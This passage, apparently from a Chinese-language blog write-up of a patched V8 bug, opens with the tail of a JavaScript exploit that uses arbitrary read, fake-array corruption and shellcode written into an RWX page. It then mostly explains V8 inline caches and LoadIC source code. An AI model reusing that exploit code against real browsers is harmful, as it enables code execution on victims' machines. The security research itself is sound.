function_">arb_read</span>(evil_func_addr + <span class="number">0xc</span>)[<span class="number">0</span>]-<span class="number">1</span></span><br><span class="line"><span class="keyword">const</span> [rwx_l, rwx_h] = <span class="title function_">arb_read</span>(shared_info_addr - <span class="number">0xb8</span>)</span><br><span class="line"></span><br><span class="line">fake_array[<span class="number">19</span>] = H.<span class="title function_">i2d</span>(<span class="number">0</span>, rwx_l)</span><br><span class="line">fake_array[<span class="number">20</span>] = H.<span class="title function_">i2d</span>(rwx_h, <span class="number">0</span>)</span><br><span class="line">shellcode.<span class="title function_">forEach</span>(<span class="function">(<span class="params">v, i</span>) =&gt;</span> &#123;</span><br><span class="line">    dv_helper.<span class="title function_">setUint32</span>(i*<span class="number">4</span>, v)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="title function_">evil_func</span>()</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/v8/v8/+/387c803020c331ea4203c85b3bb6d9d714457375">Patch</a> 如下</p>
<p><img src="https://s2.loli.net/2022/05/04/dRni3AMpzoBUxtc.png" alt="Untitled.png"></p>
<p><img src="https://s2.loli.net/2022/05/04/XDHjMyYksQRWqFZ.png" alt="Untitled 1.png"></p>
<p><code>[accessor-assembler.cc](https://chromium.googlesource.com/v8/v8/+/387c803020c331ea4203c85b3bb6d9d714457375/src/ic/accessor-assembler.cc)</code> 中将传入的 <code>receiver</code> 改为了 <code>lookup_start_object</code> ，<code>[ic.cc](https://chromium.googlesource.com/v8/v8/+/387c803020c331ea4203c85b3bb6d9d714457375/src/ic/ic.cc)</code> 中也是如此</p>
<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p><code>ICs（Inline Caches）</code>是 <code>V8</code> 中根据 <code>Shape</code> 进行快速访问的缓存，对于某代码语句比如 <code>this.x = x</code> ，比较上次执行到该语句时缓存的 <code>Map</code> 和对象当前的 <code>Map</code> 是否相同，如果相同则执行对应的 <code>IC-Hit</code> 代码，反之执行 <code>IC-Miss</code> 代码。在 <code>V8</code> 中，其会在对象上添加一个名为 <code>type_feedback_vector</code> 的数组成员（也称<strong>类型反馈向量</strong>），对于每处可能产生 <code>IC</code> 的代码，其 <code>type_feedback_vector</code> 会缓存上一次执行至该语句时对象的 <code>Map</code> 和对应的 <code>IC-Hit</code> 代码（在 <code>V8</code> 内部称为 <code>IC-Hit Handler</code>）。</p>
<p>例如我们对于下面的语句：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Point</span>(<span class="params">x,y</span>) &#123;</span><br><span class="line">	<span class="variable language_">this</span>.<span class="property">x</span> = x;</span><br><span class="line">	<span class="variable language_">this</span>.<span class="property">y</span> = y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">Point</span>(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> q = <span class="keyword">new</span> <span class="title class_">Point</span>(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">var</span> r = <span class="keyword">new</span> <span class="title class_">Point</span>(<span class="number">4</span>,<span class="number">5</span>);</span><br></pre></td></tr></table></figure>

<p>在 <code>this.x = x</code> 的时候生成 <code>map0</code> ，在 <code>this.y = y</code> 的时候生成 <code>map1</code> ，<code>Point</code> 对象的<code>type_feedback_vector</code> 数据内容如下所示：</p>
<table>
<thead>
<tr>
<th>数组下标</th>
<th>IC对应的源码</th>
<th>缓存的Map和对应的IC-Hit Handler</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>this.x &#x3D; x</td>
<td>&lt;map0, ic-hit handler&gt;</td>
</tr>
<tr>
<td>1</td>
<td>this.y &#x3D; y</td>
<td>&lt;map1, ic-hit handler&gt;</td>
</tr>
</tbody></table>
<p>总结一下就是，<code>type_feedback_vector</code> 缓存了 <code>Map</code> 和与之对应的 <code>IC-Hit Handler</code> ，<code>IC</code> 相关的逻辑就可以简化为通过访问 <code>type_feedback_vector</code> 即可判断是否 <code>IC Hint</code> 并执行对应的 <code>IC-Hit Handler</code></p>
<p><code>IC</code> 可以用状态机直观的描述：</p>
<p><img src="https://s2.loli.net/2022/05/04/SHyFep2TLjbVlP4.png" alt="Untitled 2.png"></p>
<p>初始为 <code>uninitialized</code> 状态，在经过一次 <code>IC Miss</code> 后变为 <code>pre-monomorphic</code> 态，再经过一次 <code>IC Miss</code> 后变为 <code>monomorphic</code> 态，如果一直 <code>IC Hit</code> 则保持在 <code>monomorphic</code> 态；否则再次经过 <code>IC Miss</code> 后变为 <code>polymorphic</code> 态。在 <code>polymorphic</code> 态如果继续 <code>IC Miss</code> 四次则进入 <code>megamophic</code> 态并稳定下来。在到达 <code>megamorphic</code> 态的时候，此时 <code>Map</code> 和 <code>IC-Hit Handler</code> 便不会再缓存在 <code>feedback_vector</code> 中，而是存储在固定大小的全局 <code>hashtable</code> 中，如果 <code>IC</code> 态多于 <code>hashtable</code> 的大小，则会对之前的缓存进行覆盖。（也就是 <code>stub cache</code> ）</p>
<p>以上面提到的代码为例</p>
<ul>
<li>第一次执行 <code>this.x = x</code> 语句时，<code>Point.type_feedback_vector</code> 为空，所以发生 <code>IC Miss</code> 后变为 <code>pre-monomorphic</code> 态。<code>IC-Miss Handler</code> 会分析出此时 <code>this</code> 对象的 <code>Map</code> 中不包含属性 <code>x</code>，因此会添加成员 <code>x</code>，接着会发生 <code>Map Transition</code> ，从 <code>Map0</code> 变为 <code>Map1</code> 。考虑到绝大部分函数只会被调用一次，所以 <code>V8</code> 的策略是发生第一次 <code>IC-Miss</code> 时，并不会缓存此时的 <code>map</code>，也不会产生 <code>IC-Hit handler</code>；</li>
<li>第二次执行 <code>this.x = x</code> 语句时，<code>Point.type_feedback_vector</code> 为空，所以发生 <code>IC Miss</code> 后变为 <code>monomorphic</code> 态。此时 <code>IC-Miss Hanlder</code> 除了发生 <code>Map Transition</code> 之外，还会编译生成 <code>IC-Hit Handler</code>，并将 <code>map0</code> 和 <code>IC Hit Handler</code> 缓存到 <code>Point.type_feedback_vector</code> 中。</li>
<li>第三次执行 <code>this.x = x</code> 语句时，<code>Point.type_feedback_vector</code> 不为空且有缓存 map0 的信息，由于此时的 map 一致，因此会直接调用 <code>IC-Hit Handler</code> 来添加成员 <code>x</code> 并进行 <code>Map transition</code></li>
</ul>
<blockquote>
<p>但是我在实际的 v8 源码阅读和使用中，并没有见到 pre-monomorphic 的状态，而且在 uninitialized 之前还有 no feedback 的状态，IC 有 Lazy_feedback_allocation 的机制，所以会在第 9 次才会到 uninitialized</p>
</blockquote>
<p>下面是一些 <code>feedbackvector</code> 的细节信息：</p>
<p><img src="https://s2.loli.net/2022/05/04/KvV4lYLr1yFxeP9.png" alt="Untitled 3.png"></p>
<p>对于 <code>load</code> 操作来说，会产生 <code>LdaNamedProperty</code> 字节码对照着源码来看，其是在 <code>interpreter-generator.cc</code> 中生成的：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LdaNamedProperty &lt;object&gt; &lt;name_index&gt; &lt;slot&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Calls the LoadIC at FeedBackVector slot &lt;slot&gt; for &lt;object&gt; and the name at</span></span><br><span class="line"><span class="comment">// constant pool entry &lt;name_index&gt;.</span></span><br><span class="line"><span class="built_in">IGNITION_HANDLER</span>(LdaNamedProperty, InterpreterAssembler) &#123;</span><br><span class="line">  TNode&lt;HeapObject&gt; feedback_vector = <span class="built_in">LoadFeedbackVector</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Load receiver.</span></span><br><span class="line">  TNode&lt;Object&gt; recv = <span class="built_in">LoadRegisterAtOperandIndex</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Load the name and context lazily.</span></span><br><span class="line">  LazyNode&lt;TaggedIndex&gt; lazy_slot = [=] &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">BytecodeOperandIdxTaggedIndex</span>(<span class="number">2</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  LazyNode&lt;Name&gt; lazy_name = [=] &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">CAST</span>(<span class="built_in">LoadConstantPoolEntryAtOperandIndex</span>(<span class="number">1</span>));</span><br><span class="line">  &#125;;</span><br><span class="line">  LazyNode&lt;Context&gt; lazy_context = [=] &#123; <span class="keyword">return</span> <span class="built_in">GetContext</span>(); &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function">Label <span class="title">done</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">  <span class="built_in">TVARIABLE</span>(Object, var_result);</span><br><span class="line">  <span class="function">ExitPoint <span class="title">exit_point</span><span class="params">(<span class="keyword">this</span>, &amp;done, &amp;var_result)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">AccessorAssembler::LazyLoadICParameters <span class="title">params</span><span class="params">(lazy_context, recv, lazy_name,</span></span></span><br><span class="line"><span class="params"><span class="function">                                                 lazy_slot, feedback_vector)</span></span>;</span><br><span class="line">  <span class="function">AccessorAssembler <span class="title">accessor_asm</span><span class="params">(state())</span></span>;</span><br><span class="line">  accessor_asm.<span class="built_in">LoadIC_BytecodeHandler</span>(&amp;params, &amp;exit_point);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;done);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">SetAccumulator</span>(var_result.<span class="built_in">value</span>());</span><br><span class="line">    <span class="built_in">Dispatch</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其加载 <code>receiver(recv)</code> 和 <code>property name(lazy_name)</code> ，对于 <code>o.x</code> 来说，<code>receiver</code> 就是 <code>o</code> ，<code>property name</code> 就是 <code>x</code></p>
<p>随后到 <code>AccessorAssembler::LoadIC_BytecodeHandler</code> ，主要分为七个部分：</p>
<p>第一部分：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////// Entry points into private implementation (one per stub).</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AccessorAssembler::LoadIC_BytecodeHandler</span><span class="params">(<span class="type">const</span> LazyLoadICParameters* p,</span></span></span><br><span class="line"><span class="params"><span class="function">                                               ExitPoint* exit_point)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Must be kept in sync with LoadIC.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// This function is hand-tuned to omit frame construction for common cases,</span></span><br><span class="line">  <span class="comment">// e.g.: monomorphic field and constant loads through smi handlers.</span></span><br><span class="line">  <span class="comment">// Polymorphic ICs with a hit in the first two entries also omit frames.</span></span><br><span class="line">  <span class="comment">// TODO(jgruber): Frame omission is fragile and can be affected by minor</span></span><br><span class="line">  <span class="comment">// changes in control flow and logic. We currently have no way of ensuring</span></span><br><span class="line">  <span class="comment">// that no frame is constructed, so it&#x27;s easy to break this optimization by</span></span><br><span class="line">  <span class="comment">// accident.</span></span><br><span class="line">  <span class="function">Label <span class="title">stub_call</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span>, <span class="title">miss</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span>,</span></span><br><span class="line"><span class="function">      <span class="title">no_feedback</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">IsUndefined</span>(p-&gt;<span class="built_in">vector</span>()), &amp;no_feedback); <span class="comment">// 判断是否含有feedbackvector，不是的话跳到no_feedback</span></span><br><span class="line"></span><br><span class="line">  TNode&lt;Map&gt; lookup_start_object_map =</span><br><span class="line">      <span class="built_in">LoadReceiverMap</span>(p-&gt;<span class="built_in">receiver_and_lookup_start_object</span>()); <span class="comment">// 获取lookup_start_object(要处理的对象)的map</span></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">IsDeprecatedMap</span>(lookup_start_object_map), &amp;miss); <span class="comment">// 判断lookup_start_object的map是否为deprecated map(过期的map)，是的话跳到miss</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// Usable in cases where the receiver and the lookup start object are</span></span><br><span class="line"><span class="comment">// expected to be the same, i.e., when &quot;receiver != lookup_start_object&quot;</span></span><br><span class="line"><span class="comment">// case is not supported or not expected by the surrounding code.</span></span><br><span class="line"><span class="function">TNode&lt;Object&gt; <span class="title">receiver_and_lookup_start_object</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(receiver_, lookup_start_object_);</span><br><span class="line">  <span class="keyword">return</span> receiver_; <span class="comment">// 返回receiver</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要做了两件事：</p>
<ul>
<li>判断是否含有 <code>feedbackvector</code> ，不是的话跳到 <code>no_feedback</code></li>
<li>判断 <code>lookup_start_object</code> 的 <code>map</code> 是否为 <code>deprecated map</code> （过期的<code>map</code>）</li>
</ul>
<p>第二部分：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Inlined fast path.</span></span><br><span class="line"><span class="comment">// 内联快速路径</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">Comment</span>(<span class="string">&quot;LoadIC_BytecodeHandler_fast&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">TVARIABLE</span>(MaybeObject, var_handler); </span><br><span class="line">    <span class="function">Label <span class="title">try_polymorphic</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">if_handler</span><span class="params">(<span class="keyword">this</span>, &amp;var_handler)</span></span>;</span><br><span class="line"></span><br><span class="line">    TNode&lt;MaybeObject&gt; feedback = <span class="built_in">TryMonomorphicCase</span>(</span><br><span class="line">        p-&gt;<span class="built_in">slot</span>(), <span class="built_in">CAST</span>(p-&gt;<span class="built_in">vector</span>()), lookup_start_object_map, &amp;if_handler,</span><br><span class="line">        &amp;var_handler, &amp;try_polymorphic); <span class="comment">// 判断IC是否处于Monomorphic状态</span></span><br></pre></td></tr></table></figure>

<p>这里主要是判断了 <code>IC</code> 是否处于 <code>Monomorphic</code> 状态</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TNode&lt;MaybeObject&gt; <span class="title">AccessorAssembler::TryMonomorphicCase</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    TNode&lt;TaggedIndex&gt; slot, TNode&lt;FeedbackVector&gt; vector,</span></span></span><br><span class="line"><span class="params"><span class="function">    TNode&lt;Map&gt; lookup_start_object_map, Label* if_handler,</span></span></span><br><span class="line"><span class="params"><span class="function">    TVariable&lt;MaybeObject&gt;* var_handler, Label* if_miss)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Comment</span>(<span class="string">&quot;TryMonomorphicCase&quot;</span>);</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(MachineRepresentation::kTagged, var_handler-&gt;<span class="built_in">rep</span>());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// TODO(ishell): add helper class that hides offset computations for a series</span></span><br><span class="line">  <span class="comment">// of loads.</span></span><br><span class="line">  <span class="type">int32_t</span> header_size =</span><br><span class="line">      FeedbackVector::kRawFeedbackSlotsOffset - kHeapObjectTag; <span class="comment">// 计算feedbackvector的头大小</span></span><br><span class="line">  <span class="comment">// Adding |header_size| with a separate IntPtrAdd rather than passing it</span></span><br><span class="line">  <span class="comment">// into ElementOffsetFromIndex() allows it to be folded into a single</span></span><br><span class="line">  <span class="comment">// [base, index, offset] indirect memory access on x64.</span></span><br><span class="line">  TNode&lt;IntPtrT&gt; offset = <span class="built_in">ElementOffsetFromIndex</span>(slot, HOLEY_ELEMENTS); <span class="comment">// 计算offset</span></span><br><span class="line">  TNode&lt;MaybeObject&gt; feedback = <span class="built_in">ReinterpretCast</span>&lt;MaybeObject&gt;(</span><br><span class="line">      <span class="built_in">Load</span>(MachineType::<span class="built_in">AnyTagged</span>(), vector,</span><br><span class="line">           <span class="built_in">IntPtrAdd</span>(offset, <span class="built_in">IntPtrConstant</span>(header_size)))); <span class="comment">// 取出feedbackvector中存储的map信息</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Try to quickly handle the monomorphic case without knowing for sure</span></span><br><span class="line">  <span class="comment">// if we have a weak reference in feedback.</span></span><br><span class="line">  <span class="built_in">GotoIfNot</span>(<span class="built_in">IsWeakReferenceTo</span>(feedback, lookup_start_object_map), if_miss); <span class="comment">// 判断feedback是否是lookup_start_object_map的弱引用，不是的话就跳到miss；是的话则代表是monomorphic状态</span></span><br><span class="line"></span><br><span class="line">  TNode&lt;MaybeObject&gt; handler = <span class="built_in">UncheckedCast</span>&lt;MaybeObject&gt;(</span><br><span class="line">      <span class="built_in">Load</span>(MachineType::<span class="built_in">AnyTagged</span>(), vector,</span><br><span class="line">           <span class="built_in">IntPtrAdd</span>(offset, <span class="built_in">IntPtrConstant</span>(header_size + kTaggedSize)))); <span class="comment">// 取出对应的handle</span></span><br><span class="line"></span><br><span class="line">  *var_handler = handler;</span><br><span class="line">  <span class="built_in">Goto</span>(if_handler);</span><br><span class="line">  <span class="keyword">return</span> feedback; <span class="comment">// 返回feedback</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>TryMonomorphicCase</code> 里会取出 <code>feedbackvector</code> 中存储的 <code>map</code> 信息并和 <code>lookup_start_object map</code> 的信息进行对比，如果 <code>map</code> 是弱引用的话则证明是 <code>monomorphic</code> 状态，取出对应的 <code>handle</code> 并返回 <code>feedback</code> ；不是的话则跳到 <code>miss</code></p>
<p>第三部分</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;if_handler);</span><br><span class="line"><span class="built_in">HandleLoadICHandlerCase</span>(p, <span class="built_in">CAST</span>(var_handler.<span class="built_in">value</span>()), &amp;miss, exit_point); <span class="comment">// 调用handle，也就是LoadIC的实现</span></span><br></pre></td></tr></table></figure>

<p>也就是对应的 <code>LoadIC</code> 的实现，会调用 <code>AccessorAssembler::HandleLoadICHandlerCase</code> 函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AccessorAssembler::HandleLoadICHandlerCase</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> LazyLoadICParameters* p, TNode&lt;Object&gt; handler, Label* miss,</span></span></span><br><span class="line"><span class="params"><span class="function">    ExitPoint* exit_point, ICMode ic_mode, OnNonExistent on_nonexistent,</span></span></span><br><span class="line"><span class="params"><span class="function">    ElementSupport support_elements, LoadAccessMode access_mode)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Comment</span>(<span class="string">&quot;have_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">TVARIABLE</span>(Object, var_holder, p-&gt;<span class="built_in">lookup_start_object</span>());</span><br><span class="line">  <span class="built_in">TVARIABLE</span>(Object, var_smi_handler, handler);</span><br><span class="line"></span><br><span class="line">  <span class="function">Label <span class="title">if_smi_handler</span><span class="params">(<span class="keyword">this</span>, &#123;&amp;var_holder, &amp;var_smi_handler&#125;)</span></span>;</span><br><span class="line">  <span class="function">Label <span class="title">try_proto_handler</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span>,</span></span><br><span class="line"><span class="function">      <span class="title">call_handler</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Branch</span>(<span class="built_in">TaggedIsSmi</span>(handler), &amp;if_smi_handler, &amp;try_proto_handler); <span class="comment">// 判断handle是否为SMI</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;try_proto_handler);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">GotoIf</span>(<span class="built_in">IsCodeMap</span>(<span class="built_in">LoadMap</span>(<span class="built_in">CAST</span>(handler))), &amp;call_handler);</span><br><span class="line">    <span class="built_in">HandleLoadICProtoHandler</span>(p, <span class="built_in">CAST</span>(handler), &amp;var_holder, &amp;var_smi_handler,</span><br><span class="line">                             &amp;if_smi_handler, miss, exit_point, ic_mode,</span><br><span class="line">                             access_mode);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// |handler| is a Smi, encoding what to do. See SmiHandler methods</span></span><br><span class="line">  <span class="comment">// for the encoding format.</span></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;if_smi_handler);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">HandleLoadICSmiHandlerCase</span>(</span><br><span class="line">        p, var_holder.<span class="built_in">value</span>(), <span class="built_in">CAST</span>(var_smi_handler.<span class="built_in">value</span>()), handler, miss,</span><br><span class="line">        exit_point, ic_mode, on_nonexistent, support_elements, access_mode);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;call_handler);</span><br><span class="line">  &#123;</span><br><span class="line">    exit_point-&gt;<span class="built_in">ReturnCallStub</span>(LoadWithVectorDescriptor&#123;&#125;, <span class="built_in">CAST</span>(handler),</span><br><span class="line">                               p-&gt;<span class="built_in">context</span>(), p-&gt;<span class="built_in">receiver</span>(), p-&gt;<span class="built_in">name</span>(),</span><br><span class="line">                               p-&gt;<span class="built_in">slot</span>(), p-&gt;<span class="built_in">vector</span>());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>判断 <code>handle</code> 是否为 <code>smi_handle</code> ，如果是则调用 <code>HandleLoadICSmiHandlerCase</code> ，否则判断 <code>handle</code> 的 <code>map</code> 是否为 <code>code map</code> ，是的话则直接 <code>call_handler</code>，否则调用 <code>HandleLoadICProtoHandler</code> </p>
<blockquote>
<p>在 <code>V8</code> 的 <code>IC</code> 中共有四种 <code>handle</code> ，我们可以通过 <a target="_blank" rel="noopener" href="https://chromium-review.googlesource.com/c/v8/v8/+/2398518">LoadHandler::PrintHandler</a> 来打印他们</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/05/04/PR2u3rnB984kDhC.png" alt="Untitled 4.png"></p>
<p>随后我们主要研究一下 <code>SmiHandle</code> ，查看 <code>AccessorAssembler::HandleLoadICSmiHandlerCase</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span 